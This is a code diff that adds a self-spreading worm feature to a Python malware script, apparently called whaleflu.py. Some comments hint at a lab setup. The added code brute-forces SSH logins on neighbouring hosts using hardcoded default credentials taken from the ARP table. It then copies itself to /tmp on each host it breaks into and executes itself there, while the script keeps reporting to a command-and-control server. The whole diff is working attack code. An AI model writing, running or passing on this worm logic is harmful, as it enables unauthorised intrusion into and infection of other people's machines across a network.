@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 import json
+import re
 import subprocess
 import socket
 import time
@@ -16,6 +17,78 @@ host_info = {
     "arp": "",
     "ssh_found": False
 }
+
+# List of usernames used to bruteforce ssh connections
+ssh_usernames = [
+    "admin",
+    "administrator",
+    "root"
+]
+
+# List of passwords used to bruteforce ssh connections
+ssh_passwords = [
+    "admin",
+    "administrator",
+    "root"
+]
+
+def bruteforce_malware_to_other_instances() -> None:
+    """
+    Installs paramiko via pip on the machine. Attempts to bruteforce access to
+    other instances in the network via ssh. If valid credentials are found,
+    copies the whaleflu.py to /tmp on the instance and executes it.
+    """
+    subprocess.run(
+        ["pip3", "install", "paramiko"],
+        capture_output=True,
+        text=True
+    ).stdout.strip()
+
+    import paramiko
+
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    for ip in host_info["arp"]:
+        if ip == C2C_HOST:
+            continue
+        for username in ssh_usernames:
+            for password in ssh_passwords:
+                try:
+                    ssh_client.connect(ip,
+                                    port=22,
+                                    username=username,
+                                    password=password)
+                    print(f"{host_info['hostname']}: Credentials found: {username}:{password} for {ip}")
+
+                    # If the machine is already infected, don't do anything
+                    stdin, stdout, stderr = ssh_client.exec_command("ls /tmp")
+                    if "whaleflu" in stdout.read().decode():
+                        continue
+
+                    # Create an SFTP client from the SSH connection for copying
+                    # files
+                    sftp_client = ssh_client.open_sftp()
+
+                    # Upload malware to /tmp on the remote machine
+                    pwd = subprocess.run(
+                        ["pwd"],
+                        capture_output=True,
+                        text=True
+                    ).stdout.strip()
+                    sftp_client.put(f"{pwd}whaleflu.py", "/tmp/whaleflu.py")
+
+                    # Run the malware on the other instance
+                    stdin, stdout, stderr = ssh_client.exec_command("python3 /tmp/whaleflu.py")
+
+                    sftp_client.close()
+                    ssh_client.close()
+                    continue
+                except paramiko.AuthenticationException:
+                    print(f"{host_info['hostname']}: Authentication failed: {username}:{password}.")
+                except paramiko.SSHException as ssh_exception:
+                    print(f"SSH connection failed: {ssh_exception}")
+                except FileNotFoundError as fnf_error:
+                    print(f"File not found: {fnf_error}")
 
 
 def get_host_info() -> None:
@@ -48,6 +121,8 @@ def get_host_info() -> None:
             capture_output=True,
             text=True
         ).stdout.strip()
+        ip_pattern = re.compile(r'\((\d+\.\d+\.\d+\.\d+)\)')
+        host_info["arp"] = ip_pattern.findall(host_info["arp"])
     except FileNotFoundError:
         host_info["arp"] = ""
 
@@ -95,6 +170,10 @@ def main() -> None:
     get_host_info()
     send_message_to_c2c(json.dumps(host_info).encode("utf-8"))
 
+    # Attempt to spread to other networks (excluding the C2C host in our setup)
+    bruteforce_malware_to_other_instances()
+
+    # Ping the c2c server indefinitely
     while True:
         ping_c2c()
         time.sleep(C2C_COMMUNICATION_INTERVAL_S)
